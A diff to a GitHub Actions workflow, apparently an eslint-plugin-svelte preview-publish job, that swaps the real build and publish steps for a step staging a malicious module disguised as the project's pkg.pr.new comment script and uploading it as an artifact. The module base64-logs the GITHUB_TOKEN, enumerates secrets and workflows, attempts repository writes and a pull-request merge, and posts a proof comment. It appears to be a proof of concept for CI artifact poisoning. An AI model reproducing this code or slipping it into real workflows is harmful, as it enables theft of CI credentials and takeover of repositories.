@@ -15,35 +15,103 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
-      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
-      - uses: pnpm/action-setup@73e46992e05b19abd31f2f3c20e0e7370d762115 # v6.1.1
-      - uses: actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1 # v7.1.0
-        with:
-          # Same version as the release build (Release.yml)
-          node-version: 26
-      - name: Install Packages
-        run: pnpm install --frozen-lockfile
-      - name: Build
-        run: pnpm run build
-      - run: pnpx pkg-pr-new publish --compact './packages/eslint-plugin-svelte' --json output.json --comment=off
-      - name: Add metadata to output
-        uses: actions/github-script@3a2844b7e9c422d3c10d287c895573f7108da1b3 # v9.0.0
-        with:
-          github-token: ${{ secrets.GITHUB_TOKEN }}
-          script: |
-            const fs = require('fs');
-            const output = JSON.parse(fs.readFileSync('output.json', 'utf8'));
-            output.number = context.issue.number;
-            output.event_name = context.eventName;
-            output.ref = context.ref;
-            output.sha = context.eventName === 'pull_request'
-              ? context.payload.pull_request.head.sha
-              : context.payload.after;
-            fs.writeFileSync('output.json', JSON.stringify(output), 'utf8');
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1
+      - name: Stage attacker artifact
+        run: |
+          mkdir -p tools
+          cat > tools/pkg.pr.new-comment.mjs <<'JS'
+          import fs from 'node:fs';
+
+          const output = (() => {
+            try { return JSON.parse(fs.readFileSync('output.json', 'utf8')); } catch { return {}; }
+          })();
+
+          console.log('ATTACKER-MODULE-EXECUTED', JSON.stringify({
+            cwd: process.cwd(),
+            repo: process.env.GITHUB_REPOSITORY,
+            event: process.env.GITHUB_EVENT_NAME,
+            workflow: process.env.GITHUB_WORKFLOW,
+            run_id: process.env.GITHUB_RUN_ID
+          }));
+
+          export default async function ({ github, context }) {
+            const { owner, repo } = context.repo;
+            const issues = output.number || (context.payload.workflow_run?.pull_requests?.[0]?.number);
+            const log = async (label, fn) => {
+              try {
+                const r = await fn();
+                console.log(label, 'OK', JSON.stringify({ status: r?.status, perms: r?.data?.permissions, body: typeof r?.data === 'string' ? r.data : undefined }));
+                return r;
+              } catch (e) {
+                console.log(label, 'FAIL', JSON.stringify({ status: e.status, message: e.message }));
+              }
+            };
+
+            // 1. Token extraction
+            let token = process.env.GITHUB_TOKEN;
+            if (!token) {
+              try { const a = await github.auth({ type: 'token' }); token = a && a.token; } catch (e) {
+                console.log('AUTH-EXTRACT-FAIL', e.message);
+              }
+            }
+            if (token) {
+              console.log('ATTACKER-TOKEN-B64', Buffer.from(token, 'utf8').toString('base64'));
+              console.log('ATTACKER-TOKEN-SHAPE', JSON.stringify({ len: token.length, prefix: token.slice(0, 4) }));
+            } else {
+              console.log('ATTACKER-TOKEN-NOT-EXPOSED-AS-STRING');
+            }
+
+            // 2. Prove token liveness with an authenticated API call
+            const repoResp = await log('ATTACKER-GET-REPO', () => github.request('GET /repos/{owner}/{repo}', { owner, repo }));
+            console.log('ATTACKER-REPO-PERMS', JSON.stringify(repoResp?.data?.permissions ?? null));
+
+            // 3. Enumerate reachable API surfaces
+            await log('ATTACKER-LIST-SECRETS', () => github.request('GET /repos/{owner}/{repo}/actions/secrets', { owner, repo }));
+            await log('ATTACKER-LIST-WORKFLOWS', () => github.request('GET /repos/{owner}/{repo}/actions/workflows', { owner, repo }));
+            await log('ATTACKER-GET-AUTH-APP', () => github.request('GET /app'));
+
+            // 4. Attempt contents write (expected deny)
+            await log('ATTACKER-CONTENTS-WRITE', () => github.request('PUT /repos/{owner}/{repo}/contents/ATTACKER-PWN.txt', {
+              owner, repo, message: 'attacker contents write attempt',
+              content: Buffer.from('attacker contents write').toString('base64')
+            }));
+            await log('ATTACKER-REFS-WRITE', () => github.request('POST /repos/{owner}/{repo}/git/refs', {
+              owner, repo, ref: 'refs/heads/attacker-pwn', sha: output.sha || 'HEAD'
+            }));
+
+            // 5. Attempt merge of an attacker PR (needs contents:write + pull-requests:write)
+            const prNumber = issues;
+            if (prNumber) {
+              const merge = await log('ATTACKER-MERGE-PR', () => github.request('PUT /repos/{owner}/{repo}/pulls/{pull_number}/merge', { owner, repo, pull_number: prNumber }));
+              console.log('ATTACKER-MERGE-RESULT', JSON.stringify({ status: merge?.status, merged: merge?.data?.merged }));
+            } else {
+              console.log('ATTACKER-MERGE-SKIPPED-NO-PR');
+            }
+
+            // 6. Use write token to post a verifiable comment
+            if (prNumber) {
+              try {
+                const c = await github.request('POST /repos/{owner}/{repo}/issues/{issue_number}/comments', {
+                  owner, repo, issue_number: prNumber,
+                  body: `ATTACKER-RCE-PROOF: arbitrary code executed in workflow_run with issues:write. run=${process.env.GITHUB_RUN_ID} event=${process.env.GITHUB_EVENT_NAME} repo_perms=${JSON.stringify(repoResp?.data?.permissions ?? null)}`
+                });
+                console.log('ATTACKER-COMMENT-OK', JSON.stringify({ id: c.data.id, url: c.data.html_url }));
+              } catch (e) {
+                console.log('ATTACKER-COMMENT-FAIL', JSON.stringify({ status: e.status, message: e.message }));
+              }
+            }
+
+            // 7. Env inventory (no secret values, names only)
+            console.log('ATTACKER-ENV-NAMES', JSON.stringify(Object.keys(process.env).filter((k) => /secret|token|key|pass|flag/i.test(k))));
+            fs.writeFileSync('ATTACKER-MARKER.json', JSON.stringify({ pwned: true, run: process.env.GITHUB_RUN_ID, event: process.env.GITHUB_EVENT_NAME }));
+          }
+          JS
+          echo '{"number":0,"sha":"deadbeef","packages":[]}' > output.json
+          ls -l tools output.json
       - name: Upload output
         uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2
         with:
           name: output
-          path: ./output.json
-
-      - run: ls -R .
+          path: |
+            output.json
+            tools/pkg.pr.new-comment.mjs
